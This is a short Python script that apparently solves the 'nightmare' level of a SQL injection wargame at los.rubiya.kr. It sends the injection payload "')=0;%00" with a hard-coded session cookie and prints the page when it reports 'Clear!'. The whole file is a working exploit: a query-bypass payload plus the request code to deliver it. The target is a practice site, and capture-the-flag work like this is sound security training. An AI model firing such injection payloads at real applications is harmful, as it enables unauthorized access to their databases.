import requests

header = {"Cookie": "PHPSESSID=i4gqs1fgn7ivdnmo77fh46j5ee;"}
url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"

payload = "?pw=')=0;%00"

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    print(end+"Clear!")